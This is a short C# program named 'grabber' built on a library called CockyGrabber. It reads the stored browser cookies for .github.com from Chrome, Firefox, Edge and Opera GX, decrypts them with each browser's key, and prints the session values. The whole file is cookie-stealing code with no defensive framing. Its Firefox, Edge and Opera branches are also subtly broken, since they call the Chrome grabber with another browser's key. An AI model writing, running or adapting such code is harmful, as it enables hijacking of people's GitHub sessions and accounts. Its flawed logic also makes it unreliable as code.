using CockyGrabber;
using System;
namespace grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", cg.GetKey()))
                {
                    Console.WriteLine(item.Value + "\n");
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", fg.GetKey()))
                {
                    Console.WriteLine(item.Value + "\n");
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", eg.GetKey()))
                {
                    Console.WriteLine(item.Value + "\n");
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", og.GetKey()))
                {
                    Console.WriteLine(item.Value + "\n");
                }
            }
            Console.ReadKey();
        }
    }
}
